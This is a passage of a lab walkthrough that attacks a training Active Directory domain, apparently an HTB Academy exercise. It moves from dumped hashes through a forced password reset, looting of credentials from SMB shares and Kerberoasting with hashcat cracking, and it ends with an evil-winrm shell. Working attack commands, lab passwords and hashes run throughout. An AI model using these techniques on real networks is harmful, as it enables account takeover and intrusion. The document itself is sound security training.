 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 
```

From this, I obtained several users, hashes and passwords:

```
# NTLM hash
0e20798f695ab0d04bc138b22344cea8
3bb874a52ce7b0d64ee2a82bbf3fe1cc

# Password
Gr8hambino!

# Domain user
hporter
```

Let's check if the credential set `hporter` : `Gr8hambino!` is working with `crackmapexec`.

```bash
┌──(kali㉿kali)-[~/htb/secretsdump]
└─$ crackmapexec smb 172.16.8.20 -u hporter -p Gr8hambino!
/usr/lib/python3/dist-packages/cme/cli.py:35: SyntaxWarning: invalid escape sequence '\ '
  """,
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] INLANEFREIGHT.LOCAL\hporter:Gr8hambino! 
```

The credential works! Let's check it with `net` command.

```bash
c:\DotNetNuke\Portals\0>net user hporter /dom
net user hporter /dom
The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    hporter
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 10:32:05 AM
Password expires             Never
Password changeable          6/1/2022 10:32:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/27/2024 10:09:32 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

### ForceChangePassword `ssmalls`

I think it's time to enumerate through AD network since I obtained a valid credential.
Let's run `BloodHound`.

![](attachments/aen_49.png)

From the owned user `hporter`, I can  use `ForceChangePassword` on `ssmalls` account.

Let's open rdp terminal using `xfreerdp`.
Before that, I prepared `powerview.ps1` and mount it as a share.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1 ./share

┌──(kali㉿kali)-[~/htb]
└─$ cd share      

┌──(kali㉿kali)-[~/htb/share]
└─$ xfreerdp /v:172.16.8.20 /u:hporter /p:'Gr8hambino!' /drive:share,.
```

Then, let's use `powerview.ps1` to change `ssmalls`'s password.

```bash
powershell -ep Bypass

Import-Module \\TSCLIENT\share\powerview.ps1

$SecPassword = ConvertTo-SecureString 'Gr8hambino!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT.LOCAL\hporter', $SecPassword)

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Set-DomainUserPassword -Identity ssmalls -AccountPassword $UserPassword -Credential $Cred
```

Now we've obtained a new credential set : `ssmalls` : `Password123!`

### SMB share `Department Shares` on DC01

Given the owned credentials, let's enumerate SMB shares.
`ssmalls`'s credential is working on only DC01 machine.
Let's list the existing shares.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 172.16.8.3 -u 'ssmalls' -p 'Password123!' --shares
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Password123! 
SMB         172.16.8.3      445    DC01             [+] Enumerated shares
SMB         172.16.8.3      445    DC01             Share           Permissions     Remark                                                                
SMB         172.16.8.3      445    DC01             -----           -----------     ------                                                                
SMB         172.16.8.3      445    DC01             ADMIN$                          Remote Admin                                                          
SMB         172.16.8.3      445    DC01             C$                              Default share                                                         
SMB         172.16.8.3      445    DC01             Department Shares READ            Share for department users                                          
SMB         172.16.8.3      445    DC01             IPC$            READ            Remote IPC                                                            
SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share                                                    
SMB         172.16.8.3      445    DC01             SYSVOL          READ            Logon server share  
```

The user `ssmalls` has READ permission on 4 shares. Among them, `Department Shares` is not usual. Let's take a look into it.

```bash
┌──(kali㉿kali)-[~/htb/smb_dc01_departmentshares]
└─$ smbclient "//172.16.8.3/Department Shares" -U "ssmalls" --timeout 300
Password for [WORKGROUP\ssmalls]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as IT/Private/Development/SQL Express Backup.ps1 (4.7 KiloBytes/sec) (average 4.7 KiloBytes/sec)
smb: \> exit


┌──(kali㉿kali)-[~/htb/smb_dc01_departmentshares]
└─$ tree                                                    
.
├── Accounting
│   ├── Private
│   └── Public
├── Executives
│   ├── Private
│   └── Public
├── Finance
│   ├── Private
│   └── Public
├── HR
│   ├── Private
│   └── Public
├── IT
│   ├── Private
│   │   └── Development
│   │       └── SQL Express Backup.ps1
│   └── Public
├── Marketing
│   ├── Private
│   └── Public
└── R&D
    ├── Private
    └── Public

23 directories, 1 file
```

The only file in the shares is `SQL Express Backup.ps1` of which name is intriguing.
Let's open it.

```bash
┌──(kali㉿kali)-[~/htb/smb_dc01_departmentshares]
└─$ cat IT/Private/Development/SQL\ Express\ Backup.ps1 
$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"
$daysToStoreDailyBackups = 7
$daysToStoreWeeklyBackups = 28
$monthsToStoreMonthlyBackups = 3

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
 
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "!qazXSW@"

$server = new-object Microsoft.SqlServer.Management.SMO.Server($mySrvConn)

$dbs = $server.Databases
$startDate = (Get-Date)
"$startDate"

Get-ChildItem "$backupDirectory\*_daily.bak" |? { $_.lastwritetime -le (Get-Date).AddDays(-$daysToStoreDailyBackups)} |% {Remove-Item $_ -force }
"removed all previous daily backups older than $daysToStoreDailyBackups days"

foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
{
    $dbName = $database.Name      

    $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
    $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_daily.bak"

    $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
    $smoBackup.Action = "Database"
    $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
    $smoBackup.BackupSetName = $dbName + " Backup"
    $smoBackup.Database = $dbName
    $smoBackup.MediaDescription = "Disk"
    $smoBackup.Devices.AddDevice($targetPath, "File")
    $smoBackup.SqlBackup($server) 
    "backed up $dbName ($serverName) to $targetPath"               
}

if([Int] (Get-Date).DayOfWeek -eq 0)
{
    Get-ChildItem "$backupDirectory\*_weekly.bak" |? { $_.lastwritetime -le (Get-Date).AddDays(-$daysToStoreWeeklyBackups)} |% {Remove-Item $_ -force }
    "removed all previous daily backups older than $daysToStoreWeeklyBackups days"

    foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
    {
        $dbName = $database.Name      

        $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
        $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_weekly.bak"

        $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
        $smoBackup.Action = "Database"
        $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
        $smoBackup.BackupSetName = $dbName + " Backup"
        $smoBackup.Database = $dbName
        $smoBackup.MediaDescription = "Disk"
        $smoBackup.Devices.AddDevice($targetPath, "File")
        $smoBackup.SqlBackup($server) 
        "backed up $dbName ($serverName) to $targetPath"                 
    }
}

if([Int] (Get-Date).Day -eq 1)
{
    Get-ChildItem "$backupDirectory\*_monthly.bak" |? { $_.lastwritetime -le (Get-Date).AddMonths(-$monthsToStoreMonthlyBackups)} |% {Remove-Item $_ -force }
    "removed all previous monthly backups older than $monthsToStoreMonthlyBackups days"

    foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
    {
        $dbName = $database.Name      

        $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
        $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_monthly.bak"

        $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
        $smoBackup.Action = "Database"
        $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
        $smoBackup.BackupSetName = $dbName + " Backup"
        $smoBackup.Database = $dbName
        $smoBackup.MediaDescription = "Disk"
        $smoBackup.Devices.AddDevice($targetPath, "File")
        $smoBackup.SqlBackup($server) 
        "backed up $dbName ($serverName) to $targetPath"                 
    }
}
```

This file contains `backupadm`'s password!

```bash
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "!qazXSW@"
```

### SMB Share `SYSVOL` on DC01

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/smb_dc01_sysvol]
└─$ smbclient "//172.16.8.3/SYSVOL" -U "ssmalls" --timeout 300
Password for [WORKGROUP\ssmalls]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \INLANEFREIGHT.LOCAL\DfsrPrivate\*
getting file \INLANEFREIGHT.LOCAL\scripts\adum.vbs of size 32921 as INLANEFREIGHT.LOCAL/scripts/adum.vbs (10.4 KiloBytes/sec) (average 10.4 KiloBytes/sec)
getting file \INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as INLANEFREIGHT.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 8.2 KiloBytes/sec)
getting file \INLANEFREIGHT.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as INLANEFREIGHT.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 5.6 KiloBytes/sec)
getting file \INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1096 as INLANEFREIGHT.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.7 KiloBytes/sec) (average 4.5 KiloBytes/sec)
getting file \INLANEFREIGHT.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3764 as INLANEFREIGHT.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (4.4 KiloBytes/sec) (average 4.5 KiloBytes/sec)
smb: \> exit


┌──(kali㉿kali)-[~/htb/smb_shares/smb_dc01_sysvol]
└─$ tree
.
└── INLANEFREIGHT.LOCAL
    ├── DfsrPrivate
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── MACHINE
    │   │   │   └── Microsoft
    │   │   │       └── Windows NT
    │   │   │           └── SecEdit
    │   │   │               └── GptTmpl.inf
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts
        └── adum.vbs

17 directories, 5 files
```

I think the only interesting file is `adum.vbs` file.
Let's read it.

```vbnet
┌──(kali㉿kali)-[~/…/smb_shares/smb_dc01_sysvol/INLANEFREIGHT.LOCAL/scripts]
└─$ cat adum.vbs                                       
Option Explicit

''=================================================================================================================================
''
'' Active Directory User Management script [ADUM]
''
'' Written: 2011/07/18
'' Updated: 2015.07.21
'' Author: Todd Fencl [tfencl@innotrac.com]
'' Mod Author: Todd Fencl

<SNIP>

''### VARIABLES THAT MIGHT NEED TWEAKED ###
''Needed for sending email, To, CC, mail server
'Const cTo = ""
Const cTo = "tss@inlanefreight.local; ITunixsystems@inlanefreight.local, it_noc@inlanefreight.local" 'WHO ARE WE SENDING EMAIL TO
Const cCC = "tfencl@radial.com"                         'WHO TO CC IF ANY
Const cSMTPServer = "mailhost.inlanefreight.local"      'EMAIL - EXCHANGE SERVER
Const cFrom = "helpdesk@inlanefreight.local"            'EMAIL - WHO FROM
Const cSubject = "Active Directory User Management report"      'EMAIL - SUBJECT LINE

''Most likely not needed, but if needed to pass authorization for connecting and sending emails
Const cdoUserName = "account@inlanefreight.local"       'EMAIL - USERNAME - IF AUTHENTICATION REQUIRED
Const cdoPassword = "L337^p@$$w0rD"                     'EMAIL - PASSWORD - IF AUTHENTICATION REQUIRED

<SNIP>
```

This contains the email user `account@inlanefreight.local`'s password `L337^p@$$w0rD`.

### Kerberoasting

Since I have valid AD credential set, let's try Kerberoasting attack using `impacket-GetUserSPNs`.
First, let's list the SPN users.

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ impacket-GetUserSPNs -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/ssmalls
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation 
-------------------------------------------  ------------  --------  --------------------------  --------------------------  ----------
adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 14:32:56.506935  <never>                                
backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 14:33:00.038178  <never>                                
MSSQLSvc/DB01.inlanefreight.local:1433       mssqlsvc                2022-06-01 14:32:31.178803  <never>                                
MSSQLSvc/DEVTEST.inlanefreight.local:1433    sqltest                 2022-06-01 14:32:45.522556  <never>                                
MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                   2022-06-01 14:32:49.256932  <never>                                
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev                  2022-06-01 14:32:41.913173  <never>                                
MSSQLSvc/SQL-WEB01.inlanefreight.local:1433  mssqladm                2022-06-01 14:32:52.897615  2024-12-28 02:09:39.410267             
MSSQLSvc/SQL01.inlanefreight.local:1433      svc_sql                 2022-06-01 14:32:34.850677  <never>                                
MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod                 2022-06-01 14:32:38.381946  <never>                                
SAP/APP01.inlanefreight.local                sapsso                  2022-06-01 14:33:07.225672  <never>                                
SAPsvc/SAP01.inlanefreight.local             sapvc                   2022-06-01 14:33:10.678799  <never>                                
vmware/vc.inlanefreight.local                vmwarescvc              2022-06-01 14:33:03.600665  <never>           
```

There are many service usernames found.
Due to the `ligolo` network setup, SPN request from kali may not work.
Let's use `Powerview.ps1` let's capture the SPNs on Window machine(DEV01).

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

copy ilfreight_tgs.csv \\TSCLIENT\share\ilfreight_tgs.csv
```

```perl
┌──(kali㉿kali)-[~/htb/share]
└─$ cat ilfreight_tgs.csv   
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"azureconnect","CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*azureconnect$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$B6F35633F8038A5E65BFA2E37847B2A1$1C3A1FC3B4708C2180A5B491C5C0419522EDDBD52EB61
<SNIP>
```

It captures all existing SPNs. I extracted all hashes and saved them into `ilfreight_tgs.hashes` file. Let's crack them with `hashcat`.

```bash
┌──(kali㉿kali)-[~/htb/share]
└─$ hashcat -m 13100 ilfreight_tgs.hashes /usr/share/wordlists/rockyou.txt.gz

<SNIP>

$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local*$5560c7af3830b97e94b85bd32dd488de$efede5019b0c9ba544943ba0fa2ca8e73bd8c507fc03400b19c78015d766037ae4ad7c4f6ec14b34352eeb2b919222fb2641fea58287d9dd5b2c07c00b1731476355038cccf0fd2da9bacb7293b11ca6d1487056f1fa6097570da52440bdd593b5eac7310931148a3dffd338587810c10093376e2f782290e8668cb8380036e99bc49bc2a2ccdd931d23a72a8df3b59ed89d906d67eb7c890fa0d5e961b12f756a879339664d33c6b73fb8c13452e329d5f6b4ab479dba1b6b9fd5c177115b67504b5f53bac5170e7e0c5452112e6f5f0ee0858c5618fb7fdbdf746770f1451df3538be9ac9458701e05ade159047abc40be8b56136839327b6f053e270a8b6e6d498b5444ff1fbfeb2c3f4a79eef551a630dfa6177d4d698acb6dfb2b8751508250405d73fa839680f952d3718b2ee7a74cb77b687561bef8ce9e49523a88fcd51ed2a2dcc907d1bacac161e183f4ee7456778816617badbe42e824315fd1805ffdd5ebb6489ff3a2a66efa6f071599ce3499a7d3b9d6eb1ca621bbccb6ca0728dbc7a9771f9f5a7fd48dbb0731795f20e066643e1715920ae53b9bb6eff74fc10f513aa1b73f66b57f3cdac8a90f1f58eb9f79c3e30d202a2d72ecd031ca7ef855f27bf9a1b86265cbbe8673a24e06998abf6dbbc5f16b17e7e6459f8c3cbc7d6818bc95d9273969edfd94903b2454d4dbb7a826dc44c0b16a6e2c16a92d4067065c4fceb94cdd0c71d26751f19ba29932daf2900a59e5fcb18d282d0fb049b446c842c730abb18b93c69e1c3dcb6076e429db6999a8e9d211e3f1270197f3a10ec806e8493ad26e7d441d10f96f667bd127bc2d1ee5ff17a301ca85f0e2d74a672dd97f2495e94559dcf8e6398e5d0ca571e54dd2a9cff7c83d3a3ad577ad0e52fa08fc44236c5d00c081d53ada963921c1c4b3e848238847fb292a51f907af4a885e7335dc0fd8125bad72b77282dbec3e1c5c84f7a86e54192fe3b165ab1019598a565d8e7ed87668aa4ea7aba83e6cb3fb8f52dd5d890659137d5ef5cd30bbbcd77ada68487c1d884c610bc49162b7852ce93baf9e4ab3ef95e3376fa0ae6c6c12c304beaf7b82e832dec5ac2b5c2ddc090a52a660bf58cb0c178eeb883bd8472acacc3d38068204cec995251dfb6c44b7c6a97660cd59f1d02a3ec242f0dfa2a254d86749b8d8122c98adc036fa1b50b7affec589785e0a73bab94d039af275c47b8b7eee1a7d5ff027789294e7695b1e2f5de14015d693489cd29a0b0151a8488161fd6996bd65f6cd0b792107c4324593521bdd34e45f165366f1a0208bc31dc5bcbcc4f9130919ee19de09270d22c609ba169fde2e9fab9fa7ec8b133bfc67070e60f627d5af01150ed8cef1480d3035d845bd66d83bfcbcad8d6425d3bc2d96a1ae431a65197dfa9c6ba7d1cc481f3b107d2392324d220664af8ec1cf2993868314665838e53b700d3791cffb712e08c83a76f803ffaad8771c23d489f47fba:lucky7

<SNIP>
```

I got `backupjob` service accout's password : `lucky7`

I tried to find if the service account is useful on BloodHound, but nothing useful was found.
Let's just point this out as a **Weak Service Account Credential** and move to other methods.

### WinRM shell as `backupadm`

Let's test two accounts(`backupadm`, `backupjob`) with different hosts, and different services.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 172.16.8.3 -u 'backupjob' -p 'lucky7'             

SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\backupjob:lucky7 



┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 172.16.8.20 -u 'backupjob' -p 'lucky7'

SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] INLANEFREIGHT.LOCAL\backupjob:lucky7 



┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 172.16.8.50 -u 'backupjob' -p 'lucky7'

SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\backupjob:lucky7 



┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec winrm 172.16.8.3 -u 'backupjob' -p 'lucky7'

SMB         172.16.8.3      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL)
HTTP        172.16.8.3      5985   DC01             [*] http://172.16.8.3:5985/wsman
WINRM       172.16.8.3      5985   DC01             [-] INLANEFREIGHT.LOCAL\backupjob:lucky7



┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec winrm 172.16.8.20 -u 'backupjob' -p 'lucky7'

SMB         172.16.8.20     5985   ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL)
HTTP        172.16.8.20     5985   ACADEMY-AEN-DEV  [*] http://172.16.8.20:5985/wsman
WINRM       172.16.8.20     5985   ACADEMY-AEN-DEV  [-] INLANEFREIGHT.LOCAL\backupjob:lucky7



┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec winrm 172.16.8.50 -u 'backupjob' -p 'lucky7' 

SMB         172.16.8.50     5985   ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL)
HTTP        172.16.8.50     5985   ACADEMY-AEN-MS0  [*] http://172.16.8.50:5985/wsman
WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [-] INLANEFREIGHT.LOCAL\backupjob:lucky7



┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec winrm 172.16.8.3 -u 'backupadm' -p '!qazXSW@'

SMB         172.16.8.3      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL)
HTTP        172.16.8.3      5985   DC01             [*] http://172.16.8.3:5985/wsman
WINRM       172.16.8.3      5985   DC01             [-] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@


┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec winrm 172.16.8.20 -u 'backupadm' -p '!qazXSW@'

SMB         172.16.8.20     5985   ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL)
HTTP        172.16.8.20     5985   ACADEMY-AEN-DEV  [*] http://172.16.8.20:5985/wsman
WINRM       172.16.8.20     5985   ACADEMY-AEN-DEV  [-] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@


┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec winrm 172.16.8.50 -u 'backupadm' -p '!qazXSW@'

SMB         172.16.8.50     5985   ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL)
HTTP        172.16.8.50     5985   ACADEMY-AEN-MS0  [*] http://172.16.8.50:5985/wsman
WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@ (Pwn3d!)
```

`backupadm` user can open a `winrm` shell on MS01(172.16.8.50) host!
Let's open a shell then.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 172.16.8.50 -u 'backupadm' -p '!qazXSW@'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                   

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\backupadm\Documents> whoami
inlanefreight\backupadm
```

I got a shell!

### Privilege Escalation ??

